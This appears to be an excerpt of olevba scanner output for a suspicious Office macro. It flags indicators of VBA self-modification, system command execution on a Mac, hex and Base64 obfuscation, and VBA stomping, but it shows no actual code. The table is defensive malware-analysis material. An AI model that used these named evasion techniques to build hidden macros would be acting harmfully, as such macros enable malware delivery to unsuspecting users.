|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

